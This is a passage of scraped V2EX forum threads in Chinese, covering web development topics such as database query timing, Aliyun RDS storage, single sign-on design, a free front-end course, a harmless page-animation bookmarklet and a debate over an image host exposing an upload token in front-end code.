但是给出这段代码好歹给个官方支持的使用方法吧？ PS: 建议 LS 说话不要上来问候智商，先想一遍为什么 LZ 会发这个帖子问这个问题 再来问候智商", " 一个 jsonp 就可以搞定的， chinaz 非逼得这么做，感觉是脱了裤子放屁", " \r", "39,56 两楼都告诉你支持 jsonp 了，你还在这里打滚？", "v2 不能删帖有时还挺好的。。。", "我就静静看(⊙o⊙)~磕嗑瓜子儿", "不管用户能怎么 hack 得到想要的结果，那也不能改变文档本来就有问题这一点", " 站长高中的时候已经把 V2EX 建起来了", "这就是做了前端这么多年的水平？？不是很懂前端", "今天看到这个帖子成了热门帖，有必要这么嘲讽吗？\r", "“把下面一小段代码加到你的主页中即可在您的网页上中显示来访用户的 IP 及其地区！”\r", "chinaz 的说明是有问题的，直接按照他的说明操作显示的确实不是预期效果。我认为，只要自己的产品被别人使用，就应该提供正确的使用文档，而不是让其他人去猜、测试。", "一黑黑两", "事情是这样的：\r", "1 ，上古时期，大家都是提供<script></script>标签，内容是直接 document.write ，文档如实描述。\r", "2 ，后来发现，这种方式打包了数据和展示，并不很科学。一个接口，应该只做接口该做的事：如实返回数据，让应用层去决定如何展示。所以，返回了 json 结构体。\r", "3 ，无奈老用户非常多，让大家都修改代码不现实。于是做了兼容：如果是浏览器直接访问，返回 document.write （和以前逻辑保持一致）；如果是 ajax 调用，只返回 json 数据。（显然这点没做好）\r", "4 ，再后来，为了方便使用者，支持了 jsonp 。\r", "5 ，在做 234 演进的时候，文档 1 并没有做任何更新。\r", "\r", "看问题，要有历史观和发展观。/doge", " 言之有理\r", "也是一个文档和程序脱节的好例子", "这事是楼主一生的黑点了。。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://tianshuang.me/2017/04/%E3%80%8A%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E6%A0%B7%E8%BF%9E%E6%8E%A5%E7%9A%84%E3%80%8B%E7%AC%94%E8%AE%B0/index.html\" rel=\"nofollow\">https://tianshuang.me/2017/04/%E3%80%8A%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E6%A0%B7%E8%BF%9E%E6%8E%A5%E7%9A%84%E3%80%8B%E7%AC%94%E8%AE%B0/index.html</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "[分享] 《网络是怎样连接的》笔记", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>下面两个语句</p>\n<pre><code>sql&gt; SELECT * FROM ***.trade_record ORDER BY id LIMIT 10 OFFSET 999999\n[2017-04-11 11:16:34] 10 rows retrieved starting from 1 in 341ms (execution: 318ms, fetching: 23ms)\n\n\nsql&gt; SELECT id FROM ***.trade_record ORDER BY id LIMIT 1 OFFSET 999999\n[2017-04-11 11:16:56] 1 row retrieved starting from 1 in 7s 691ms (execution: 7s 688ms, fetching: 3ms)\n</code></pre>\n<p>请问为啥查询数量少,字段少的 反而消耗的时间多呢</p>\n<p>execution: 执行</p>\n<p>fetching: 获取么?..</p>\n<p>为啥差距这么大呢</p>\n</div></div>"], "reply": "2", "tittle": "PSQL 查询耗时问题", "comment": ["EXPLAIN 看一下查询计划", "我也比较关心这个问题"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>昨天下午购买的阿里云 RDS ，想把原来放在另一个帐号下的数据库迁过来。\n昨天网上刚想迁移数据，发现新的 RDS 数据占用就为 5GB 。\n当时以为是预分配什么的，我就想先导入数据看看。于是我把 1.5GB 的 SQL 文件导入了，发现数据库空间占用为 7GB 。\n我把刚刚导入的数据库删除，空间占用回到 5GB 多一点。\n本人不是专业数据库人员，程度只是在能够把公司业务跑起来的程度，不知道阿里云 RDS 这种情况是否正常。\n打客服电话说是 MySQL InnoDB 引擎需要分配这些空间，然后我发工单，客服人员说什么 log Undo 之类的。\n我就想不通了，刚开通的 RDS ，为什么会有这么大的 log ？ undo ？</p>\n<p>======================================================</p>\n<p>下面是部分工单内容：</p>\n<p>lix***@gmail.com :   RDS 实例 ID ： rm-bp16q22z5i23ldp3u\n数据库引擎 ： MySQL5.7\n具体操作说明 ： 没有任何操作的时候数据占用 5G 以上。\n问题描述 ： 云数据库 RDS MySQL5.7 单机基础版，刚开通， 20G 的空间就已经使用 5G 多，我不知道这是否正常。我担心这些如果是无用数据，以后可能会影响正常的数据备份和恢复效率。<br>\n2017-04-12 09:36:37</p>\n<p>售后工程师 :    您的问题我们已收到，会尽快为您查看。请您耐心等待，谢谢<br>\n2017-04-12 10:12:23</p>\n<p>售后工程师 :    您好，看了下实例，是系统文件较大。</p>\n<p>系统文件</p>\n<p>系统文件涉及到 ibdata1 系统表空间文件和 ib_logfile0 、 ib_logfile1 日志文件。</p>\n<p>ibdata1 文件：</p>\n<p>InnoDB 引擎表由于支持多版本并发控制（ MVCC ），因此会将查询所需的 Undo 信息保存在系统文件 ibdata1 中。</p>\n<p>如果存在对一个 InnoDB 表长时间不结束的查询，而且在查询过程中表有大量的数据变化，则会生成大量的 Undo 信息，导致 ibdata1 文件尺寸增加。</p>\n<p>由于 MySQL 内部机制的限制， ibdata1 文件目前是不支持收缩的。</p>\n<p>因此出现这样的情况，在不升级磁盘空间的前提下，比较好的解决方法是在同地域同可用区购买相同配置的 RDS 实例，通过 DTS 工具将数据迁移到新实例中。</p>\n<p>建议：监控和清理执行时间过长的会话或事务，请参考： RDS MySQL 管理长时间运行查询</p>\n<p>ib_logfile 日志文件：</p>\n<p>ib_logfile0 和 ib_logfile1 日志文件保存 InnoDB 引擎表的事务日志信息，其文件大小尺寸固定，不可以改变。较大的尺寸在高并发事务的场景下有利于减少事务日志文件切换的次数，提高实例性能。<br>\n2017-04-12 10:13:43</p>\n<p>lix***@gmail.com :   你好，我的 RDS 中已存在的 5GB 空间占用，是在租用 RDS 服务还未进行任何操作的时候就存在的。你说要重新租用 RDS 并进行数据迁移可以解决问题，我很怀疑。\n现在数据库中没有一行我自己的数据。\n不知可否给我进行重置？<br>\n2017-04-12 10:18:12</p>\n<p>售后工程师 :    您好，非常抱歉，实例创建之后系统文件就无法重置了，只可以通过迁移来解决，您参考 <a href=\"https://help.aliyun.com/knowledge_detail/41739.html\" rel=\"nofollow\">https://help.aliyun.com/knowledge_detail/41739.html</a> 。<br>\n2017-04-12 12:22:44</p>\n<p>===================================================</p>\n<p>求安慰，求开导，大家购买的 RDS 是这样的吗？</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "阿里云 RDS MySQL 5.7 开通就占用了 5GB 存储空间", "comment": []},
{"content": ["<div class=\"topic_content\">如题：公司需要做一个统一认证系统的方案，讨论的时候有很多疑问，主要疑问就是 C/S 系统如何接入等一系列问题。\r<br>现在主要架构为 ApacheDS 作为 LDAP 数据源存储用户信息， B/S 系统采用 CAS+LDAP 的 SSO 方案，对于 C/S 结构是提供了一套 API ，用于验证用户名密码是否正确。主要的迷惑有一下几点：\r<br>\r<br>1.接入统一认证的原系统权限如何处理？初步讨论的是在原系统建立本地账户与统一认证账户的关联表，在登录成功之后通过关联表取本地账户权限完成授权，但是如何将统一认证账户与原系统账户比较智能地方式关联起来呢，开始想到的是通过用户的部门属性进行关联，但是业务复杂同一用户有可能是多个角色，感觉会把问题复杂到统一授权等问题上去。\r<br>\r<br>2.用户新增流程是如何的，其它子系统是如何响应的，网上搜到很多种方案，一种是直接新增用户的时候同步原系统库，不过感觉侵入度比较大，而且也要处理同步失败的问题，自己也没想出很好的方案。\r<br>\r<br>如何使用标准技术将 C/S 系统改造为支持统一认证并且能够完成自身授权对应管理这方面感觉没看到比较完善的资料，请指教，感谢～</div>"], "reply": "1", "tittle": "C/S 系统接入统一认证系统方案请教", "comment": ["公司里有 ad 直接用 ad 呗， ad 是完全兼容 ldap 的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://wj.qq.com/s/1206919/4d9d\" rel=\"nofollow\">https://wj.qq.com/s/1206919/4d9d</a><br>\n如果你或你身边的有朋友(仅限学生)想学习前端开发(网页开发、网站建设、 JavaScript 等技术)，我们正在<b>免费</b>招募一些学习者。<br>\n学习方式：线上交流，每天会有规定的任务，以及专门的指导，有兴趣，有时间，而且能够长期坚持的朋友快来报名吧。<br>\n这一期报名截止时间：<b>2017 年 4 月 17 日</b><br>\n转发给身边有需要的学生朋友~~</p>\n</div></div>"], "reply": "56", "tittle": "技术就是要一起来学，想学前端的学生看过来~~", "comment": ["- - 靠谱么，感觉会泄露个人信息啊\r", "能否介绍下你们的团队和目的呢？", "  靠谱的啊，有人带比自己学快很多。想做好技术普及的事情，不会泄露个人信息的。  \r", "已经是第二期啦，第一期网页开发效果不行，网站建设效果很棒", "我看往期网站后台都是 wordpress 框架， js 语言有用到哪个框架？\r", "网站建设建议直接用云服务吧，本地造车能学到的不多，效率也低", "已经报名了😂试试看。", "已经报名。问卷点提交之后不知道提交成功没有(>﹏<)(一直在转圈)", " 网站建设用的就是 wordpress ，搭建 wordpress ，用的是 AWS 的 EC2 和 RDS （或阿里云、腾讯云）,纯命令行配置环境，学生自己买域名...全部都是真实的开发场景，不是在本地弄的。    \r", "懂的人都知道 AWS 是云服务器里面算是最难的，但是上期网站建设，即使是没有接触过代码的人，都搭建好网站了", "已报名，试试", "  嗯，好滴，报名了要认真学哈~~", "极客教程-https://www.geekjc.com", "可惜网站建设的活动过期了", "额，为啥强调必需学生来着。。\r", "身边有个刚毕业的土木朋友在自学软件，想转给他的", "看了您的介绍，我有点存疑。\r", "\r", "您用的腾讯问卷会泄漏个人信息，已截图。我不相信一个能够教别人去建设网站的人会如此不在意用户的隐私。\r", "\r", "还请大概介绍一下您的团队以及目的。\r", "\r", "\r", "注意个人信息安全。\r", " \r", " \r", " \r", " 对于你的这种疑虑，我也不清楚该怎么向你解释。我在 v 站的头像是我本人，以及 id 是我的微信号，不知道能不能自证清白...(艹，刚补了几集人民的名义，已经不能好好说话了....)\r", "\r", "做这件事情的目的，前面回复已经说过啦，就是想让更多的人能够学会技术。讲得太过理想化或太\"情怀\"，很多人不会那么接受，这确实可以理解（但我们真的就是想做好这样的事情...）。\r", "\r", "没法理解的地方可能有两点：一是免费带，效果如何？二是，免费做这样的事情，到底有没有其他什么目的，比如信息泄露之类，甚至暗藏什么套路。\r", "\r", "之所以会这么做，因为我们正在不断摸索零基础的小白学习技术的有效方式，前面的反馈来看，效果很不错，比自学和看视频要强，我们也没有什么恶意的套路。", " 因为工作的人每天没有足够的时间可以学习吧", " \r", " \r", "\r", "确实是因为工作的人学习变数太多，而且学习积极性不那么高", " 以后会有的", "看了介绍好迷啊...\r", "\"网页开发网站建设 JavaScript\"具体指什么? 我的第一感觉是 nodejs(因为最近在学这个).\r", "结果看评论是 WordPress, 这就比较尴尬了. 把 WordPress 装上去写几篇文章装几个主题插件也算学 WordPress; 开发主题和插件也算学 WordPress, 但难度根本不在一个层次上啊...\r", "那么 WordPress 跟 JavaScript 又有多少关系? 一个全能的 CMS 系统和前台脚本. 如果不是开发主题的话, 挺难联想到一起的啊...\r", "配置云服务器? 没用过... 就 vps 来说, 搭建服务用一键安装包也算搭建; apt 全家桶也算搭建; 源码编译也算搭建环境, 难度和所需知识又不是一个档次...\r", "学生自己买域名? 那么每个学生自己把这一套学下来大概需要花多少钱? 除了域名还是不是要买云服务器啊什么的...\r", "隐私方面我倒是不在意, 大天朝的平民们有个 P 隐私...\r", "\r", "Q: 说了这么多, 你是来砸场子的?\r", "A: 我只是觉得, 课程内容描述得不是很清楚.", " 按照你的分析，他们这培养的是早期的站长", " 你们的问卷结果没有关闭吧，所有人可见呢", "课程内容，，讲师背景啥的都没有，，你们这些报名的人真的是为自己负责？", "不建议入前端坑 :P", "算了吧。前端这东西全靠自学。", " 统计结果所有人可见的。", "厉害了，还在学前端。。。现在低端市场已经饱和。", " 感谢提醒。", "技术或许开始因为兴趣一起学，但终究还是要自己一个人寂寞地学下去", " 晕，谢谢提醒，服，腾讯问卷居然还这样...以为和金数据差不多，这个点没有注意到", "欢迎参加百度 ife 前端技术学院 ", " 网站建设这一块我们确实是以 wordpress 来入门，通过实际的搭建东西来入门是学习技术的最快的方式，这个内容虽然不难，但是让很多新手可以接触到 linux 命令行、云服务器、网站性能等很多知识，以实用的程序为契机，让学习者以看得到效果的方式来展开，确实是很有必要的。\r", "\r", "网站建设和前端关系还是很大，很多人看书和看慕课这些，连个网站都没有过，这就比较尴尬了...这种连具体东西都做出来的学习方式我觉得是比较有害的...自己购买域名是为了实战，整个学习就只会花域名以及服务器的一点钱，这个动手是有必要的。\r", "\r", "对新手来说，没有什么比动手更重要的了。", " 网站建设只是一个方面，会有其他内容，不只是培养站长...站长虽然说起来挺过时的，但是能够让新手将 linux 、前端、后端等知识更直观的展现给学习者们，看得到结果，会对学习的帮助比较大", " 谢谢提醒~~已解决", "报名表好多框框，没有提示，不知道该写甚么", " \r", " \r", " \r", " \r", "\r", "因为我们在做技术普及的事情，目的就是让更多的人可以学会前端，低级的前端我觉得应该像 word 一样是人人都应该会的。\r", "\r", "技术学习肯定是要以自学以及动手为主，但是能够有人带入门以及和大家一起来学，学习效果会更好。", " 嗯，已经解决...这个腾讯问卷有点尴尬...因为它的问卷样式比麦客、金数据好看，就选了它，没想到问题还挺多", " 百度前端学院也好，还是 udemy 、慕课之类的，在学习的过程中我们并没有排斥它。", " 是不是问卷的题目没有刷新出来？", " 感觉要做技术普及的事情的话，其实 V2EX 并不是一个好地方啊，本身 V2EX 上面大部分人都会前端吧，要去就应该去像知乎这类地方，我觉的能吸引的人更多", " 这个报名已经截止了把，现在没法报名了", "已经报名了，请问要审核多久呢？我对于前端非常感兴趣，最近也有在上 coursera 上面的入门课程。希望能够加入到这个团体中来。", " 这周哈，下周一就会开始一起学习", " 嗯 之后会发到知乎上面去的", " OK 。就像你所说的。那么为什么刚入门的小白这要加入你的课程 or 小组学习呢？讲授者的资历背景能否够资格来”传道“？我觉得任何一个对自己负责的人都会有这样的疑问。而你的描述显然没有一个合理的答案。", "有个疑惑。如果有人乱填个人信息，比如学校，专业那些，你们有途径鉴别么？\r", "现在普遍的情况是很多人都注重自己的个人隐私，所以如果不是必须的，我个人的建议是可以考虑只是简单的收集大学年级和专业。", " 报名已截止……", " 我们现在也只是在做第二期的免费招募，暂时没有想过要找那么多人，所以目前很多地方不规范，文案写的也比较随意。以后再招募的时候会更完善一些。", " 可能也不会很严格的鉴别吧，注重个人隐私肯定是要的，但是我们也没有过分去收集那么多涉及隐私的资料，只是要求大家填一些与一起学习有关的信息而已。\r", "\r", "只简单收集年级和专业，不知道对方的联系方式总不行吧，我们希望大家有时间来学，所以填写你可以拿出多长时间来学，也是我们的筛选门槛吧；是否有基础，以及用什么电脑，这个也是教学要考虑的吧，我们要求填写的都是与学习技术很相关的内容啊", " 就是啊，手机用的 chrome 浏览器，后面有几个框都没显示问题", "仅限学生？", " 嗯，是啊，因为学生有时间学肯学", "hello~", "有兴趣。。能旁听么？。。。", " 技术学习要靠动手啊，听可不好...", " 好的。祝你办的越来越好。", " 🤝嗯，谢谢", "不拿出点实力看看？比如你用的技术栈？有没有牛人？只是做学生，是不是只能带动学生呢？纯属个人疑问，当然我相信很多人也会有。讲真我就是自学", " 前面已经解释过为什么只做学生啦。我们也称不上大牛也就月薪 2 万的水平，资质平平，不过带人更应该强调的是大家的学习效果，我们整理了一套有效的学习方法，并不断实践了很多次，虽然还不完善，就目前来说效果比其他我所见过的学习方式要好。"]},
{"content": ["<div class=\"topic_content\">有人科普一下么？\r<br>\r<br><a target=\"_blank\" href=\"http://www.coolshell.cn\" rel=\"nofollow\">www.coolshell.cn</a></div>"], "reply": "41", "tittle": "左耳朵耗子的博客， coolshell，有一个很好玩的东西，右上角有一个不太显眼的地方，“High 一下!”，点击之后，整个网站都动起来了，请问这个是怎么回事？", "comment": ["……\r", "\r", "或许楼主需要这个\r", "\r", "突然还有声音，睡觉的都被吵醒。。", " 第一次玩的时候，感觉很带感，呵呵", "可以把 high 一下 拖到书签位置，然后打开其他网站再点击书签，同样有效", " 我已经把这个代码复制下来了，准备有空试试，呵呵", "......楼主你 大半夜的", "就是一段 JS 代码，我都收藏好几年了", "有点意思。", "High 一下之后看博客更带感(滑稽)", "逼格~", "只有 logo 在动", "挺好玩的东西", " 让子弹飞一会", " 我有一次连续点击了十几次，太有感了，呵呵", "High 起来,在这停顿!   跑题..\r", "挺好玩的效果.", " 拖不到书签里面去 Chrome 浏览器", "什么？大清亡了？", "找到了这个 ", "还有声音。。。。", " ", "哈哈哈哈玩嗨了 放在 v 站首页  玩了不下十遍", " 第一个头像。。。", "Harlem Shake web version, lol", " 第一个头像已经亮瞎", "哈哈哈哈哈", "还有这个(Kick Ass): \r", "很早就看过了，哈林摇的效果\r", "\r", "好像就是这个博主？", "哈哈哈哈哈好逗逼的感觉 23333333", "这个很简单啊，就是通过浏览器地址栏执行 JS 代码而已，一个简单的例子，把下面的代码拖到书签栏，然后在任一页面点击一下就能看到效果：\r", "\r", "javascript:setInterval(() => {document.querySelectorAll('p,img,button,h1,h2,h3').forEach(x=>x.style=`transform:rotate(${Math.random()*777}deg) scale(${Math.random()*3}); transition:all 500ms`)}, 500);", "233333 ，笑到我不想说话", " 好玩", "擦，上班时候点了一下，整个办公室都惊了", " 第一个头像哈哈哈哈哈哈哈", "怎么只有 logo 在动？", "哈哈哈 笑死我了", "嗨起来", "就是歌太难听", " 让子弹飞一会", " \r", "这叫做哈林舞国外火了很长一段时间."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>每日荐文</p>\n<p><a href=\"https://www.qcloud.com/community/article/537217001491374183?fromSource=gwzcw.84418.84418.84418\" rel=\"nofollow\">一个只有 99 行代码的 JS 流程框架</a></p>\n</div></div>"], "reply": "5", "tittle": "一个只有 99 行代码的 JS 流程框架", "comment": ["有一种 goto  的感觉（逃", " \r", "\r", "我也看出了 goto 的感觉......", "这个跟 Promise 和 ReactiveX\r", "有什么关系", "好框架", "如果工作流有这么简单就好了， lol"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前在一线城市互联网企业，最近在看机会，看到阿里的未来酒店，感觉应该是阿里系，但是从面试官的口中得知不是正统的阿里旗下的，是飞猪和别的公司合资的公司，做的是飞猪的业务，不知道 这样还值得去么？</p>\n</div></div>"], "reply": "6", "tittle": "阿里的未来酒店", "comment": ["楼主是拿到了 offer 了吗？", "en", "哪投的。。？可留个邮箱吗", "这是什么企业？", "你的价值观和气功大师的一致吗就敢去", " 拉钩上有；\r", " 鬼知道什么企业；\r", " wtf 气功大师什么鬼。。。"]},
{"content": "", "reply": "5", "tittle": "有没有用 OpenResty 实现的开源项目推荐学习一下？", "comment": ["kong api gateway", "什么类型的都行？\r", " 这个有部分功能用了", "你需要 awesome openresty", "那么需要推荐这位老哥 @", " ，借宝地问一下，老哥，搭建好后台 500 错误。。。还有最近有什么更新吗？", "openresty 官网"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>虽然已经收到多说邮件,知道多说不维护了\n但是这是什么鬼,现在离 6 月份还有很久啊\n<img alt=\"\" src=\"https://ws1.sinaimg.cn/large/692869a3gy1feiwlgvgdaj20kt0fv769.jpg\"></p>\n</div></div>"], "reply": "8", "tittle": "多说这是什么鬼...", "comment": ["哈哈哈", "秦始皇站在阿房宫上使劲顶\r", "这都是什么奇葩评论", " 最后一条才厉害", "同样遇到了类似的情况", "数据乱了而已，淡定", "同样遇到了类似的情况", "都说了要停服，还不赶紧撤", "多说的公告出来后, 已经及时把评论导出.\r", "\r", "然后两天前看到好多垃圾评论, 在多说上把站点删除了"]},
{"content": ["<div class=\"topic_content\">今天看贴图库开发文档的时候，发现：\r<br>\r<br><img src=\"https://ws1.sinaimg.cn/large/0060lm7Tgy1feht14go0uj30eh09cmxo.jpg\" class=\"embedded_image\"> \r<br>\r<br>因为 token 固定，我就想这样岂不是能让别人随意上传到自己相册？\r<br>\r<br>加他们官方群想问问，运营说这只是个例子\r<br>\r<br>然后我又问，如果纯前端，不经过后端的话，怎么能保证安全，此时我艾特了他们的两个技术\r<br>\r<br><img src=\"http://ww4.sinaimg.cn/large/0060lm7Tgy1feht4qjykhj30e704cq4c.jpg\" class=\"embedded_image\"> \r<br>\r<br>没时间解释……\r<br>\r<br>过了一会又答非所问：\r<br>\r<br><img src=\"http://ww3.sinaimg.cn/large/0060lm7Tgy1feht73q3t1j30dl0463yn.jpg\" class=\"embedded_image\"> \r<br>\r<br>我给他解释了一遍，此时！！！他回复：\r<br>\r<br><img src=\"http://ww3.sinaimg.cn/large/0060lm7Tgy1fehtc4kzgkj30ed047wgp.jpg\" class=\"embedded_image\"> \r<br>\r<br>嗯，我的网站不牛逼，不用了行不行，你们又不缺我一个用户\r<br>\r<br>不过，以后在网上碰到有让推荐图床的，我会说：千万别用贴图库！\r<br>\r<br>要是有人问贴图库好不好\r<br>\r<br>我就回复：贴图库不好，千万别用贴图库:)\r<br>\r<br>最后说一句，其实贴图库真的能上传到别人的相册\r<br>\r<br>=========\r<br>\r<br>记得有吐槽节点来着，怎么没了</div>"], "reply": "67", "tittle": "贴图库家的程序员真牛 b，『没时间解释』", "comment": ["贴图库怎么样？", "建议贴出上下文", " 已退群", "没时间解释了  快上车", "其实我想说的是，你怕被别人拿了你的 token ，\r", "你为什么不自己用 php 把图片发到贴图库去？ 这样别人就拿不到你的 token 了\r", "而是通过前端直接上传到贴图库？", "这技术，这素质，迟早要完", " 『你怕被别人拿了你的 token 』\r", "\r", "我知道 token 放后端，我只是想问问如果纯前端有没用什么安全措施能保护下", "很明显没有， token 不变，别人拿了就可以用，或许升级 VIP 客户就有  哈哈哈，比如绑定域名", "只能呵呵了。 ", "   ", "   ", " ", "感人。我也就用贴图库传一些要外链到某些不能上传图片的论坛", " vip 就算了吧，虽然价格可以，但……\r", "\r", " smms 多好", "态度决定一切 产品还是次要的", "技术也是人。。。互相理解。。。\r", "回到问题上来，纯前端的话应该只有把 token 写到表单。。。有没有大触有新思路？", "我对这个程序员表示部分理解，程序员就不太应该被拉去当客服，因为有的时候客户问的技术相关的东西实在是太傻太气愤，浪费自己大量时间和心情。就那个 token 上传，稍有开发经验的都会知道放前端肯定是错误的，如果前端上传参考阿里云 OSS 之类的做法，其实这件事跑去问别人等于浪费彼此时间", "如果 token 没有过期机制，那么纯前端的方案就不存在", " 这种东西感觉纯前端无解\r", "\r", " 首先，不想回答可以像另一个人一样，要么就别回复，或者说去找客服，其次，问的问题傻？既然这么做很傻，他们为什么还要这么做？", "除非你能保证 token 的一次性，不然放在前段就是等着被滥用。好像七牛有个客户端直传，似乎符合你的要求。", " 给那个事例显然是因为他们是写 php 不是写 python 的🙄", "一看这种傻方案就可以直接放弃了。", "这种基于 token 直接认证的 如果没有合适的一次一密机制 或者（短时间内）定期重置机制 基本是不能用纯前端实现的 你在前端的东西全暴露给用户 完全就是白送啊\r", "\r", "如果非得想用纯前端技术解决的话，只能自己添加自己的认证机制，先从用户中转到自己的 server 鉴权，再用这个方案提交", "遇到这种给他说哪里有问题，但对方直接反问你很厉害这类的，还是别浪费自己时间了。", "退群还是可以看聊天记录的吧", "你这个『没时间解释』跟别人不太一样啊。", " \r", " \r", " \r", "前端确实没法弄，既然他们自己觉得没问题，那就让他们这么搞吧", " 他可能觉得我不是他们的超级大客户，不值得回答，也没必要跟免费用户或一年只付 100 块钱的用户废话", "  刚去看了下他们家的文档，根据上面的参数判断， token 貌似不是死的。是要后端生成给前端用的，有过期时间的。和七牛差不多。", "微博图床~", "因为这个参数叫 token ，所以你会觉得不安全。因为 token 这个词一般都和账户验证什么的有关。\r", "如果把他改成 AlbumId 呢？是不是觉得没那么严重了？\r", "\r", "如果你网站提供用户上传功能，那么用户才可能在前端代码中看到这个 token 。你说别人可以往你相册里上传文件，关键是你自己先提供了上传功能啊。\r", "至于这个 token 是不是可以做其他和你账户相关的操作，我没有用过贴图库，所以不知道。\r", "\r", "以上个人观点，如有不对，欢迎吐槽。", "个人觉得，这个只是一个演示，就是告诉你上传到贴图库服务器需要哪些参数，用 form 这种表单形式最简单明了了，实际生产环境中肯定不不可能直接放 token 到前端，贴图库应该是不支持直接上传，需要先上传图片到你的服务器，你的服务器再把这个图片连同这个 token 传递给贴图库服务器", "如果是前端上传的话，除非你的页面可以 XSS ，不然别人也拿不到这个 token 吧", "因为 token 固定，我就想这样岂不是能让别人随意上传到自己相册？ \r", "\r", "是啊，没问题，如果你有一个页面把 token 暴露出来我还不是可以上传到你的相册。。这个 token 只能防刷不能防偷用\r", "\r", "新浪微博不就是么，大家都拿来做图床了，连 token 都没人关系，反正直接外链。。", "#不知道什么是 csrf 的看不懂本贴#", " 根本不是 csrf\r", "他那 token 基本就是一个 user_id 不变的", "没上下文这帖子没意义啊！", "一个图片先传到服务端再由服务端传到图床这种方式意味着时间加倍和流量消耗加倍\r", "所以前端直传是比较好的方案，我们公司用的是阿里云，每次上传前先向服务端请求密钥也就是 token 这些，这里请求到的 token 是有过期时间的，这样也就不存在楼主所说的问题了。然后再上传就行了", " 对呀，但是，如果把这个 token 写在前端，是直接可以用的，不需要他提供上传功能\r", "\r", " 直接写在页面了\r", "\r", " 虽然是演示，但他们确实这么做了", " 你看，这就是问题所在，你这个向服务端请求 token 是用 ajax 吗，如果是的话，那我也向你服务端请求 token ，在我本地也能传到你的 oss 吧？\r", "\r", "有些人说反正全站在自己手里，他上传了给删掉不就行了，可是，这不是给自己找麻烦么，别人上传垃圾图，你每天还得检查有没有被别人上传，还得保证自己的图片不被误删，增加工作量啊", " \r", " “全站”→权限", "明明可以再写一个后端上传的示例的。。。", " 我这里用 ajax 请求 token （需要登录验证）是需要验证权限的，没有权限根本就请求不到的", "就是一个简单的名字空间吧 233 。\r", "类似那种谁都可以上传的公共空间，只不过需要有人站出来买单， 233\r", "\r", "我觉得似乎这里主要是例子写错了，这个东西可能本来只适合后端用\r", "至于说不小心暴露之后没法改的问题，似乎很多服务都做成这样了，比如微信的 appid 和 secret （别人跟我说可以换，我没找到在哪换的\r", "\r", "那其实比如阿里 oss 服务，你根本没法限制说只放出多少下载量（可能有吧，我读文档没找到）我感觉也是一个漏洞，和 po 主的空间被占用的问题有点类似。不过如果别人传些反党反政府的内容到你那就不好了……", " 那我可以注册一个你们的账号，模拟登陆或者请求时带 cookie ，还能怎么防？", " 这种问题你通过服务端中转图片也是需要考虑的吧，不只是前端直传才有的问题。服务端中转怎么防前端请求 token 就用同样的策略，防不了只能当正常用户来咯。", " 后端很容易防住， token 在后端算，这样的话只能通过自己站上传，别人也没法恶习批量上传垃圾图，当然，要是非得说”“你网站很牛逼？”，那就没法子了，哈哈", "以前加过他们群,还帮他们写过客户端(虽然被主动拒绝使用了),这个\"行者\"至少在当时还是一个不错的人.\r", "没有上下文不做其他评论.", "1.就算 token 存在一次性 本来不就是暴露给用户传图到你相册的吗 。 2.防止滥用问题 他本来就是免费 还要啥自行车。 3.我司应用一天 1T 流量，所以之前在找流量便宜的图片空间，以前跟他们聊过，他家带宽不要钱，所以便宜，但是移动访问不了，最后放弃，还是用了 X 牛。", " 牛家的确实很好用， 1t 的量，你司业务很大啊", "就这种牛逼哄哄的态度，不出大问题，会听进去意见吗？会去想吗？", "贴图库辣鸡，居然还有人用", "纯前端不应该有这种 token 的验证方式，而是应该改成签名验证。\r", "举个简单例子，用用户 id+时间戳+图片名+Token ，生成一个 hmac 签名，和 id 、时间戳、图片名一起发送到服务端。\r", "服务端接收到以后，根据用户 id 从数据库里查出这个用户的真实 token ，对用户传过来的 id 、时间戳、图片名进行签名，再和用户传过来的签名进行比较。（可能中间还需要比较当前时间和用户传来的时间戳在一定范围内，防止重放枚举爆破攻击等）", "如果光前端的话你做个校验不让别人进你的图片上传页面就行了，当然你要隐藏这个 token 并且将图片上传提供给别人只有自己在后台发起请求了。所以你这个问题，问我我也有点烦。当然态度并不会那么差。", "『没时间解释』我以为要开车赶紧上车呢！！", " 消息管理器里面还可以找到聊天记录", " 带宽不要钱别是吃百度云加速的吧 2333 ，云加速移动访问也经常出问题", " 不太明白欸，能否详细说下？一直觉得前端防这个简直无解，谢谢\r", "\r", "\r", " “不让别人进你的图片上传页面就行”，如果开放注册的话，任何注册用户肯定是可以看到的", " 既然你都有注册了，难道你还是纯前端？肯定放到后端去呀。而官方只是简单给了个使用的例子，让你明白怎么调用而不是照抄。", "没想着要做好的程序员", "对方只是提供了一个简单的接口，写了个简单的例子来说明接口的用法，不适合某些业务可以自己加个中转吧。。。\r", "说实话，面对楼主的疑问，回答除了“这只是个例子”以外，不知道还能回答什么", "前端可以 jwt", " \r", "你可以这么理解，你不是怕 Token 被别人拿到么，那你就把 Token 和文件名一起 md5 以后，作为一个新 Token 。\r", "但这个方法需要“贴图库”那边支持，他们那边拿到这个新的 Token ，需要将你原本的 token 和文件名一起 md5 ，再和新的 Token 比较。", "纯前端没办法，即便是七牛，也得有个后端获取有有效期的 token 。", " 那你就把 Token 和文件名一起 md5 以后\r", "\r", "token 这不是又到了前端暴露？", "一直用七牛 \r", "贴图库免费的时候 就在她们群里\r", "但是从没用过 一直不相信她们", " 但你原始 token 没有暴露呀，这个新 Token 只是个签名而已，用户如果要上传其他文件（文件名不同），就必须要一个新的签名，只要原始 Token 没有暴露，用户就不能随便上传内容。", "楼主可以参考下阿里云的前端上传示例，这种做法就比较安全了。楼主用的图床理论上应该有类似的用法吧，没用过不发表意见", "这个 token 是用来做 CSRF 验证的么？？", " 用大厂子放心点\r", "\r", " 阿里云的哪个例子？\r", "\r", " 单纯的上传验证"]},
